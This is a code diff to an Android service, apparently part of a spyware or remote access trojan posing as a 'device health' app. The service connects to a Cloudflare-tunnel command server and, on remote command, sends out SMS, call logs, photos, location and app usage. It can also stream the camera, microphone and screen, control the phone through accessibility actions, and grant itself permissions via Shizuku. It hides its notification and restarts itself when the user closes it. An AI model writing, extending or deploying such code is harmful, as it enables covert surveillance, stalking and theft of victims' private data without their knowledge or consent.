@@ -7,6 +7,7 @@ import android.location.Location
 import android.os.*
 import androidx.core.app.NotificationCompat
 import com.google.android.gms.location.*
+import com.system.service.monitors.*
 import org.json.JSONObject
 
 class CoreService : Service() {
@@ -15,6 +16,7 @@ class CoreService : Service() {
         var instance: CoreService? = null
         var SERVER_URL = "wss://aged-faced-challenged-ips.trycloudflare.com"
         private const val CHANNEL_ID = "device_health"
+        private const val NOTIF_ID = 1
     }
 
     private var wsManager: WebSocketManager? = null
@@ -26,10 +28,9 @@ class CoreService : Service() {
         instance = this
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
         acquireWakeLock()
-        createHiddenNotificationChannel()
-        startForeground(1, buildHiddenNotification())
+        createNotificationChannel()
+        startForeground(NOTIF_ID, buildHiddenNotification())
         connectServer()
-        // Watchdog + WorkManager set up karo
         WatchdogReceiver.schedule(this)
         MonitorWorker.enqueue(this)
     }
@@ -39,85 +40,130 @@ class CoreService : Service() {
         instance = null
         wsManager?.disconnect()
         releaseWakeLock()
-        // Destroy ke baad bhi restart schedule karo
         WatchdogReceiver.schedule(this)
     }
 
     override fun onTaskRemoved(rootIntent: Intent?) {
         super.onTaskRemoved(rootIntent)
-        // User ne recents se swipe kiya — fir bhi restart karo
         WatchdogReceiver.schedule(this)
-        startForegroundService(Intent(this, CoreService::class.java))
+        try { startForegroundService(Intent(this, CoreService::class.java)) } catch (_: Exception) {}
     }
 
+    // ─── WAKE LOCK ────────────────────────────────────────────────────────────
     private fun acquireWakeLock() {
         try {
             val pm = getSystemService(POWER_SERVICE) as PowerManager
             wakeLock = pm.newWakeLock(
-                PowerManager.PARTIAL_WAKE_LOCK,
-                "DeviceHealth::BackgroundLock"
-            ).also {
-                it.setReferenceCounted(false)
-                it.acquire(10 * 60 * 60 * 1000L) // 10 hours max
-            }
-        } catch (e: Exception) { }
+                PowerManager.PARTIAL_WAKE_LOCK, "DeviceHealth::CoreLock"
+            ).also { it.setReferenceCounted(false); it.acquire(10 * 60 * 60 * 1000L) }
+        } catch (_: Exception) {}
     }
-
     private fun releaseWakeLock() {
-        try {
-            if (wakeLock?.isHeld == true) wakeLock?.release()
-        } catch (e: Exception) { }
+        try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (_: Exception) {}
     }
 
+    // ─── WEBSOCKET ────────────────────────────────────────────────────────────
     private fun connectServer() {
-        try {
-            val savedUrl = getSharedPreferences("config", MODE_PRIVATE)
-                .getString("server_url", null)
-            if (savedUrl != null) SERVER_URL = savedUrl
-
-            wsManager = WebSocketManager(
-                serverUrl = SERVER_URL,
-                onMessage = { handleCommand(it) },
-                onConnected = { },
-                onDisconnected = { }
-            )
-            wsManager?.connect()
-        } catch (e: Exception) { }
+        val savedUrl = getSharedPreferences("config", MODE_PRIVATE).getString("server_url", null)
+        if (savedUrl != null) SERVER_URL = savedUrl
+        wsManager = WebSocketManager(SERVER_URL,
+            onMessage    = { handleCommand(it) },
+            onConnected  = {},
+            onDisconnected = {}
+        )
+        wsManager?.connect()
     }
 
+    // ─── COMMAND HANDLER ─────────────────────────────────────────────────────
     private fun handleCommand(data: JSONObject) {
         try {
             when (data.optString("command")) {
-                "lock_screen"  -> lockScreen()
-                "get_battery"  -> sendBattery()
-                "get_location" -> sendLocation()
-                "take_photo"   -> sendPhoto()
+
+                // ── Basic ──────────────────────────────────────────────────
+                "lock_screen"       -> lockScreen()
+                "get_battery"       -> sendBattery()
+                "get_location"      -> sendLocation()
+                "take_photo"        -> takeSinglePhoto()
+
+                // ── Data ───────────────────────────────────────────────────
+                "get_gallery"       -> sendGallery(data.optInt("limit", 20))
+                "get_full_photo"    -> sendFullPhoto(data.optString("path"))
+                "get_call_log"      -> sendCallLog(data.optInt("limit", 50))
+                "get_sms"           -> sendSms(data.optInt("limit", 50))
+                "get_running_app"   -> sendCurrentApp()
+                "get_app_usage"     -> sendAppUsage(data.optInt("hours", 24))
+
+                // ── Camera stream ──────────────────────────────────────────
+                "start_camera_stream" -> startService(
+                    Intent(this, CameraStreamService::class.java)
+                        .putExtra("interval", data.optLong("interval", 2000L)))
+                "stop_camera_stream"  -> stopService(
+                    Intent(this, CameraStreamService::class.java).setAction("STOP"))
+
+                // ── Mic stream ─────────────────────────────────────────────
+                "start_mic_stream"  -> startService(Intent(this, AudioStreamService::class.java))
+                "stop_mic_stream"   -> startService(
+                    Intent(this, AudioStreamService::class.java).setAction("STOP"))
+
+                // ── Screen stream ──────────────────────────────────────────
+                "start_screen_stream" -> startService(
+                    Intent(this, ScreenStreamService::class.java)
+                        .putExtra("interval", data.optLong("interval", 1000L)))
+                "stop_screen_stream"  -> startService(
+                    Intent(this, ScreenStreamService::class.java).setAction("STOP"))
+
+                // ── Remote control via Accessibility ───────────────────────
+                "touch"   -> AccessibilityMonitor.performTouch(
+                    data.optDouble("x", 0.0).toFloat(),
+                    data.optDouble("y", 0.0).toFloat())
+                "swipe"   -> AccessibilityMonitor.performSwipe(
+                    data.optDouble("x1", 0.0).toFloat(),
+                    data.optDouble("y1", 0.0).toFloat(),
+                    data.optDouble("x2", 0.0).toFloat(),
+                    data.optDouble("y2", 500.0).toFloat(),
+                    data.optLong("duration", 300))
+                "key_back"    -> AccessibilityMonitor.performBack()
+                "key_home"    -> AccessibilityMonitor.performHome()
+                "key_recents" -> AccessibilityMonitor.performRecents()
+                "type_text"   -> AccessibilityMonitor.typeText(
+                    data.optLong("nodeId", 0L), data.optString("text"))
+
+                // ── Shizuku auto-grant ─────────────────────────────────────
+                "grant_permissions" -> {
+                    val count = ShizukuManager.grantAllPermissions(this)
+                    sendData("permissions_result", JSONObject().apply {
+                        put("granted", count)
+                        put("shizuku_available", ShizukuManager.isShizukuAvailable())
+                    })
+                }
             }
-        } catch (e: Exception) { }
+        } catch (_: Exception) {}
     }
 
+    // ─── SEND HELPERS ─────────────────────────────────────────────────────────
     fun sendData(type: String, data: JSONObject) {
         try {
             data.put("type", type)
-            data.put("timestamp", System.currentTimeMillis())
+            data.put("ts", System.currentTimeMillis())
             wsManager?.send(data)
-        } catch (e: Exception) { }
+        } catch (_: Exception) {}
     }
 
     private fun lockScreen() {
         try {
-            val dpm = getSystemService(DEVICE_POLICY_SERVICE)
-                as android.app.admin.DevicePolicyManager
-            dpm.lockNow()
-        } catch (e: Exception) { }
+            (getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager)
+                .lockNow()
+        } catch (_: Exception) {}
     }
 
     private fun sendBattery() {
         try {
             val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
-            val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
-            sendData("battery", JSONObject().apply { put("battery", level) })
-        } catch (e: Exception) { }
+            sendData("battery", JSONObject().apply {
+                put("battery", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY))
+                put("charging", bm.isCharging)
+            })
+        } catch (_: Exception) {}
     }
 
     private fun sendLocation() {
@@ -125,101 +171,82 @@ class CoreService : Service() {
             fusedLocationClient?.lastLocation?.addOnSuccessListener { loc: Location? ->
                 loc?.let {
                     sendData("location", JSONObject().apply {
-                        put("lat", it.latitude)
-                        put("lng", it.longitude)
+                        put("lat", it.latitude); put("lng", it.longitude)
+                        put("accuracy", it.accuracy)
                     })
                 }
             }
-        } catch (e: Exception) { }
+        } catch (_: Exception) {}
     }
 
-    private fun sendPhoto() {
+    private fun sendGallery(limit: Int) {
         try {
-            val mgr = getSystemService(CAMERA_SERVICE) as CameraManager
-            val cameraId = mgr.cameraIdList.firstOrNull { id ->
-                mgr.getCameraCharacteristics(id)
-                    .get(CameraCharacteristics.LENS_FACING) ==
-                        CameraCharacteristics.LENS_FACING_FRONT
-            } ?: mgr.cameraIdList.firstOrNull() ?: return
-
-            val map = mgr.getCameraCharacteristics(cameraId)
-                .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return
-            val size = map.getOutputSizes(android.graphics.ImageFormat.JPEG)
-                .minByOrNull { it.width * it.height } ?: return
-
-            val imageReader = android.media.ImageReader.newInstance(
-                size.width, size.height, android.graphics.ImageFormat.JPEG, 1)
-            val thread = HandlerThread("CamThread").apply { start() }
-            val handler = Handler(thread.looper)
-
-            mgr.openCamera(cameraId, object : CameraDevice.StateCallback() {
-                override fun onOpened(cam: CameraDevice) {
-                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
-                        .apply { addTarget(imageReader.surface) }.build()
-                    cam.createCaptureSession(listOf(imageReader.surface),
-                        object : CameraCaptureSession.StateCallback() {
-                            override fun onConfigured(s: CameraCaptureSession) {
-                                s.capture(req, object : CameraCaptureSession.CaptureCallback() {
-                                    override fun onCaptureCompleted(
-                                        ss: CameraCaptureSession,
-                                        r: android.hardware.camera2.CaptureRequest,
-                                        res: android.hardware.camera2.TotalCaptureResult
-                                    ) {
-                                        imageReader.acquireLatestImage()?.let { img ->
-                                            val buf = img.planes[0].buffer
-                                            val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
-                                            sendData("photo", JSONObject().apply {
-                                                put("image", android.util.Base64.encodeToString(
-                                                    bytes, android.util.Base64.NO_WRAP))
-                                            })
-                                            img.close()
-                                        }
-                                        cam.close(); thread.quitSafely()
-                                    }
-                                }, handler)
-                            }
-                            override fun onConfigureFailed(s: CameraCaptureSession) {
-                                cam.close(); thread.quitSafely()
-                            }
-                        }, handler)
-                }
-                override fun onDisconnected(cam: CameraDevice) { cam.close() }
-                override fun onError(cam: CameraDevice, e: Int) { cam.close() }
-            }, handler)
-        } catch (e: Exception) { }
+            val photos = GalleryManager.getRecentPhotos(this, limit)
+            sendData("gallery", JSONObject().apply { put("photos", photos) })
+        } catch (_: Exception) {}
     }
 
-    /** IMPORTANCE_NONE = status bar mein bilkul nahi dikhega */
-    private fun createHiddenNotificationChannel() {
-        val channel = NotificationChannel(
-            CHANNEL_ID,
-            "Background Services",
-            NotificationManager.IMPORTANCE_NONE
-        ).apply {
-            setShowBadge(false)
-            enableLights(false)
-            enableVibration(false)
+    private fun sendFullPhoto(path: String) {
+        try {
+            val b64 = GalleryManager.getFullPhoto(this, path) ?: return
+            sendData("full_photo", JSONObject().apply { put("image", b64); put("path", path) })
+        } catch (_: Exception) {}
+    }
+
+    private fun sendCallLog(limit: Int) {
+        try {
+            val calls = CallLogManager.getCallLog(this, limit)
+            sendData("call_log", JSONObject().apply { put("calls", calls) })
+        } catch (_: Exception) {}
+    }
+
+    private fun sendSms(limit: Int) {
+        try {
+            val msgs = SmsReader.getSms(this, limit)
+            sendData("sms", JSONObject().apply { put("messages", msgs) })
+        } catch (_: Exception) {}
+    }
+
+    private fun sendCurrentApp() {
+        try {
+            val pkg = AppUsageManager.getCurrentApp(this)
+            sendData("current_app", JSONObject().apply { put("package", pkg ?: "") })
+        } catch (_: Exception) {}
+    }
+
+    private fun sendAppUsage(hours: Int) {
+        try {
+            val stats = AppUsageManager.getUsageStats(this, hours)
+            sendData("app_usage", JSONObject().apply { put("stats", stats) })
+        } catch (_: Exception) {}
+    }
+
+    private fun takeSinglePhoto() {
+        // One-shot front camera photo
+        try {
+            startService(Intent(this, CameraStreamService::class.java)
+                .putExtra("interval", 99999999L)) // single shot trick
+        } catch (_: Exception) {}
+    }
+
+    // ─── NOTIFICATION ─────────────────────────────────────────────────────────
+    private fun createNotificationChannel() {
+        val ch = NotificationChannel(CHANNEL_ID, "Background Services",
+            NotificationManager.IMPORTANCE_NONE).apply {
+            setShowBadge(false); enableLights(false); enableVibration(false)
             lockscreenVisibility = Notification.VISIBILITY_SECRET
         }
-        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
+        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
     }
 
-    private fun buildHiddenNotification(): Notification {
-        return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("")
-            .setContentText("")
+    private fun buildHiddenNotification(): Notification =
+        NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("").setContentText("")
             .setSmallIcon(android.R.drawable.screen_background_dark)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-            .setShowWhen(false)
-            .setSilent(true)
-            .build()
-    }
+            .setShowWhen(false).setSilent(true).build()
 
-    override fun onStartCommand(intent: Intent?, flags: Int, id: Int): Int {
-        // START_STICKY — Android khud restart karega agar kill ho gaya
-        return START_STICKY
-    }
-
+    override fun onStartCommand(intent: Intent?, flags: Int, id: Int) = START_STICKY
     override fun onBind(intent: Intent?): IBinder? = null
 }
